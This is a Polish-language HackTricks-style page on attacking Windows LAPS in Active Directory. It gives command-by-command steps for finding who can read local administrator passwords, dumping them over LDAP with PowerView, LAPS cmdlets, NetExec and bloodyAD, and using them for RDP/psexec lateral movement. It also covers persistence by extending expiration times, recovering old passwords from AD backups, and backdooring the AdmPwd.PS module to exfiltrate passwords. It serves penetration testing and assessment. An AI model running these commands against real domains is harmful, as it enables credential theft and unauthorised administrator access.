# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Podstawowe informacje

Obecnie podczas assessmentu można spotkać **2 flavours LAPS**:

- **Legacy Microsoft LAPS**: przechowuje hasło lokalnego administratora w **`ms-Mcs-AdmPwd`**, a czas wygaśnięcia w **`ms-Mcs-AdmPwdExpirationTime`**.
- **Windows LAPS** (wbudowany w Windows od aktualizacji z kwietnia 2023 r.): nadal może emulować tryb legacy, ale w trybie natywnym używa atrybutów **`msLAPS-*`**, obsługuje **password encryption**, **password history** oraz **DSRM password backup** dla kontrolerów domeny.

LAPS służy do zarządzania **hasłami lokalnego administratora**, dzięki czemu są one **unikalne, losowe i często zmieniane** na komputerach dołączonych do domeny. Jeśli możesz odczytać te atrybuty, zwykle możesz wykonać **pivot jako lokalny administrator** do zaatakowanego hosta. W wielu środowiskach interesujące jest nie tylko samo odczytanie hasła, ale także ustalenie, **komu przydzielono dostęp** do atrybutów haseł.

### Atrybuty Legacy Microsoft LAPS

W obiektach komputerów w domenie implementacja Legacy Microsoft LAPS powoduje dodanie dwóch atrybutów:<sup>[[1]](#references)</sup>

- **`ms-Mcs-AdmPwd`**: **hasło administratora w plain text**
- **`ms-Mcs-AdmPwdExpirationTime`**: **czas wygaśnięcia hasła**

### Atrybuty Windows LAPS

Natywny Windows LAPS dodaje do obiektów komputerów kilka nowych atrybutów:<sup>[[2]](#references)</sup>

- **`msLAPS-Password`**: clear-text password blob przechowywany jako JSON, gdy szyfrowanie nie jest włączone
- **`msLAPS-PasswordExpirationTime`**: zaplanowany czas wygaśnięcia
- **`msLAPS-EncryptedPassword`**: zaszyfrowane aktualne hasło
- **`msLAPS-EncryptedPasswordHistory`**: zaszyfrowana historia haseł
- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**: zaszyfrowane dane hasła DSRM dla kontrolerów domeny
- **`msLAPS-CurrentPasswordVersion`**: śledzenie wersji oparte na GUID, używane przez nowszą logikę wykrywania rollbacków (schemat forest dla Windows Server 2025)

Gdy **`msLAPS-Password`** jest możliwy do odczytu, jego wartość jest obiektem JSON zawierającym nazwę konta, czas aktualizacji oraz clear-text password, na przykład:<sup>[[2]](#references)</sup>
```json
{"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
```
### Sprawdź, czy jest aktywowane
```bash
# Legacy Microsoft LAPS policy
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Native Windows LAPS binaries / PowerShell module
Get-Command *Laps*
dir "$env:windir\System32\LAPS"

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" |
? { $_."ms-mcs-admpwdexpirationtime" -ne $null } |
select DnsHostname

# Native Windows LAPS-enabled computers
Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
select DnsHostname
```
## Dostęp do haseł LAPS

Możesz **pobrać surową politykę LAPS** z `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol`, a następnie użyć **`Parse-PolFile`** z pakietu [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser), aby przekonwertować ten plik do formatu czytelnego dla człowieka.

### Polecenia cmdlet PowerShell dla starszej wersji Microsoft LAPS

Jeśli zainstalowany jest moduł starszej wersji LAPS, zwykle dostępne są następujące polecenia cmdlet:
```bash
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read the LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
### Windows LAPS PowerShell cmdlets

Native Windows LAPS zawiera nowy moduł PowerShell oraz nowe cmdlets:
```bash
Get-Command *Laps*

# Discover who has extended rights over the OU
Find-LapsADExtendedRights -Identity Workstations

# Read a password from AD
Get-LapsADPassword -Identity wkstn-2 -AsPlainText

# Include password history if encryption/history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory

# Query DSRM password from a DC object
Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText

# Use alternate credentials for an authorized decryptor
$cred = Get-Credential CONTOSO\LAPSDecryptor
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -DecryptionCredential $cred
```
Kilka szczegółów operacyjnych ma tutaj znaczenie:<sup>[[3]](#references)</sup>

- **`Get-LapsADPassword`** automatycznie obsługuje **legacy LAPS**, **clear-text Windows LAPS** oraz **encrypted Windows LAPS**.
- Jeśli hasło jest zaszyfrowane i możesz je **odczytać**, ale nie możesz go **odszyfrować**, cmdlet zwraca metadane, takie jak **`Source`**, **`DecryptionStatus`** i **`AuthorizedDecryptor`**, nawet jeśli nie może zwrócić hasła w clear-text.
- W przypadku **encrypted Windows LAPS** **uprawnienie do odczytu** i **uprawnienie do odszyfrowania** to **różne mechanizmy kontroli**. Dostęp do odczytu OU / obiektu nie oznacza automatycznie, że możesz odszyfrować **`msLAPS-EncryptedPassword`**.
- **Historia haseł** jest dostępna tylko wtedy, gdy włączone jest **Windows LAPS encryption**.
- Na kontrolerach domeny zwracane źródło może mieć wartość **`EncryptedDSRMPassword`**.

Jest to przydatne podczas assessmentu, ponieważ pole **`AuthorizedDecryptor`** wskazuje, **dla którego użytkownika lub grupy zaszyfrowano blob**, często zmieniając nieudany odczyt hasła w nowy cel privilege escalation.

### PowerView / LDAP

**PowerView** może również posłużyć do ustalenia, **kto może odczytać hasło, a następnie je odczytać**:
```bash
# Legacy Microsoft LAPS: find principals with rights over the OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Legacy Microsoft LAPS: read the password directly from LDAP
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Native Windows LAPS clear-text mode
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
```
Jeśli **`msLAPS-Password`** jest dostępny do odczytu, przeanalizuj zwrócony JSON i wyodrębnij **`p`** jako hasło oraz **`n`** jako nazwę zarządzanego lokalnego konta administratora.
```bash
# Extract both the password and the real managed account name
$laps = (Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password)."msLAPS-Password" | ConvertFrom-Json
$laps.n
$laps.p
```
To pole **`n`** ma znaczenie w nowszych wdrożeniach, ponieważ **Windows LAPS automatic account management** może być ukierunkowane na **custom account** zamiast wbudowanego konta **`Administrator`**, a nowsze systemy **Windows 11 24H2 / Windows Server 2025** mogą nawet **randomize** nazwę tego konta.<sup>[[4]](#references)</sup>

### Linux / remote tooling

Nowoczesne narzędzia obsługują zarówno legacy Microsoft LAPS, jak i Windows LAPS.
```bash
# NetExec / CrackMapExec lineage: dump LAPS values over LDAP
nxc ldap 10.10.10.10 -u user -p password -M laps

# Filter to a subset of computers
nxc ldap 10.10.10.10 -u user -p password -M laps -o COMPUTER='WKSTN-*'

# Use read LAPS access to authenticate to hosts at scale
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps

# If the local admin name is not Administrator
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps customadmin

# Legacy Microsoft LAPS with bloodyAD
bloodyAD --host 10.10.10.10 -d contoso.local -u user -p 'Passw0rd!' \
get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
--attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
Uwagi:

- Nowsze buildy **NetExec** obsługują **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`** oraz **`msLAPS-EncryptedPassword`**.
- **`pyLAPS`** jest nadal przydatny do obsługi **legacy Microsoft LAPS** z systemu Linux, ale obsługuje wyłącznie **`ms-Mcs-AdmPwd`**.
- Nowsze cross-platform tools, takie jak **`LAPS4LINUX`**, tools oparte na **`dpapi-ng`** oraz nowsze workflows **NetExec**, mogą również obsługiwać **native Windows LAPS** z hostów innych niż Windows.
- Jeśli środowisko używa **encrypted Windows LAPS**, prosty odczyt LDAP nie wystarczy; musisz również być **authorized decryptor** (lub posiadać równoważny materiał deszyfrujący, taki jak offline domain DPAPI-NG root key material).<sup>[[5]](#references)</sup>
- W systemach **Windows 11 24H2 / Windows Server 2025** nie zakładaj, że zarządzane konto lokalnego administratora zawsze nazywa się **`Administrator`**. Automatic account management może utworzyć niestandardowe konto i opcjonalnie losowo zmieniać jego nazwę, dlatego przed użyciem **`--laps`** na dużą skalę najpierw wykryj nazwę konta za pomocą **`n`** / **`Account`**.<sup>[[4]](#references)</sup>

### Nadużycie synchronizacji katalogu

Jeśli masz uprawnienia do **directory synchronization** na poziomie domeny zamiast bezpośredniego dostępu do odczytu każdego obiektu komputera, LAPS nadal może być interesujący.

Połączenie **`DS-Replication-Get-Changes`** z **`DS-Replication-Get-Changes-In-Filtered-Set`** lub **`DS-Replication-Get-Changes-All`** może służyć do synchronizowania atrybutów **confidential / RODC-filtered**, takich jak legacy **`ms-Mcs-AdmPwd`**. BloodHound modeluje to jako **`SyncLAPSPassword`**. Informacje o uprawnieniach replikacji znajdziesz w [DCSync](dcsync.md).

## LAPSToolkit

[**LAPSToolkit**](https://github.com/leoloobeek/LAPSToolkit) ułatwia enumeration LAPS za pomocą kilku functions.<sup>[[6]](#references)</sup>\
Jedną z nich jest parsowanie **`ExtendedRights`** dla **wszystkich komputerów z włączonym LAPS.** Pokazuje ono **grupy** **delegowane konkretnie do odczytu haseł LAPS**, którymi często są użytkownicy należący do chronionych grup.\
**Konto**, które **dołączyło komputer** do domeny, otrzymuje `All Extended Rights` względem tego hosta, a uprawnienie to daje **kontu** możliwość **odczytu haseł**. Enumeration może ujawnić konto użytkownika, które może odczytać hasło LAPS na hoście. Może to pomóc w **targetowaniu konkretnych użytkowników AD**, którzy mogą odczytywać hasła LAPS.
```bash
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expiration time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## Dumpowanie haseł LAPS za pomocą NetExec / CrackMapExec

Jeśli nie masz interaktywnego PowerShell, możesz zdalnie wykorzystać to uprawnienie za pośrednictwem LDAP:
```bash
# Legacy syntax still widely seen in writeups
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps

# Current project name / syntax
nxc ldap 10.10.10.10 -u user -p password -M laps
```
Zrzuca wszystkie sekrety LAPS, które użytkownik może odczytać, umożliwiając późniejsze przemieszczanie się lateralne przy użyciu innego hasła lokalnego administratora.

## Korzystanie z hasła LAPS
```bash
xfreerdp /v:192.168.1.1:3389 /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## LAPS Persistence

### Data wygaśnięcia

Po uzyskaniu uprawnień administratora można **uzyskać hasła** i **uniemożliwić** maszynie **aktualizowanie** jej **hasła**, ustawiając **datę wygaśnięcia w przyszłości**.

Legacy Microsoft LAPS:
```bash
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## SYSTEM on the computer is needed
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
Natywny Windows LAPS używa zamiast tego **`msLAPS-PasswordExpirationTime`**:
```bash
# Read the current expiration timestamp
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime

# Push the expiration into the future
Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
```
> [!WARNING]
> Hasło nadal zostanie zmienione, jeśli **admin** użyje **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`** lub jeśli włączona jest opcja **Do not allow password expiration time longer than required by policy**.

### Zastrzeżenie dotyczące wycofywania snapshotów w nowszym Windows LAPS

Starsze techniki wycofywania snapshotów / obrazów są **mniej niezawodne** w przypadku nowszych wdrożeń **Windows LAPS**. W **Windows 11 24H2 / Windows Server 2025**, jeśli schemat lasu zawiera **`msLAPS-CurrentPasswordVersion`** (**schemat lasu Windows Server 2025**), klient porównuje lokalnie buforowany GUID z wartością przechowywaną w AD i **natychmiast zmienia hasło**, gdy wycofanie utworzy **torn state**.

W praktyce oznacza to, że persistence oparte na snapshotach lub próby przywrócenia starszego, znanego hasła lokalnego admina mogą szybko spowodować utratę dostępu, zamiast przetrwać do następnego standardowego wygaśnięcia hasła.<sup>[[2]](#references)</sup>

Ta ochrona dotyczy wyłącznie **AD-backed Windows LAPS** i nadal zależy od tego, czy przywrócona maszyna może ponownie **uwierzytelnić się w AD**. Jeśli maszyna nie może już komunikować się z AD, **historia haseł** lub **dostęp do backupu AD** mogą nadal uratować sytuację.

### Zastrzeżenie dotyczące manipulacji automatycznym zarządzaniem kontem

Gdy włączone jest **automatic account management**, Windows LAPS zarządza cyklem życia kontrolowanego lokalnego konta admina. Nieoczekiwane próby zmiany nazwy, rekonfiguracji lub innego manipulowania tym kontem mogą zostać odrzucone z błędem **`STATUS_POLICY_CONTROLLED_ACCOUNT`** / **`ERROR_POLICY_CONTROLLED_ACCOUNT`**, dlatego persistence zależne od cichej modyfikacji zarządzanego konta LAPS jest mniej niezawodne na nowszych endpointach.<sup>[[4]](#references)</sup>

### Odzyskiwanie historycznych haseł z backupów AD

Gdy włączone są **szyfrowanie Windows LAPS + historia haseł**, zamontowane backupy AD mogą stać się dodatkowym źródłem sekretów. Jeśli masz dostęp do zamontowanego snapshotu AD i możesz użyć **recovery mode**, możesz odpytać starsze przechowywane hasła bez komunikowania się z aktywnym DC.<sup>[[3]](#references)</sup>
```bash
# Query a mounted AD snapshot on port 50000
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode

# Historical entries if history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
```
Jest to głównie istotne w przypadku **AD backup theft**, **offline forensics abuse** lub **disaster-recovery media access**.

### Backdoor

Oryginalny kod źródłowy legacy Microsoft LAPS można znaleźć [here](https://github.com/GreyCorbel/admpwd), dlatego możliwe jest umieszczenie backdooru w kodzie (na przykład wewnątrz metody `Get-AdmPwdPassword` w `Main/AdmPwd.PS/Main.cs`), który będzie w jakiś sposób **exfiltrate new passwords or store them somewhere**.

Następnie skompiluj nowy plik `AdmPwd.PS.dll` i upload it na maszynę do `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (oraz zmień czas modyfikacji).

## References

- [1] [Introduction to Microsoft LAPS – Local Administrator Password Solution](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
- [2] [Windows LAPS schema and rights extensions for Windows Server Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
- [3] [Get started with Windows LAPS and Windows Server Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory)
- [4] [Windows LAPS account management modes](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes)
- [5] [LAPS 2.0 Internals - XPN Infosec Blog](https://blog.xpnsec.com/lapsv2-internals/)
- [6] [LAPSToolkit - leoloobeek](https://github.com/leoloobeek/LAPSToolkit)

{{#include ../../banners/hacktricks-training.md}}
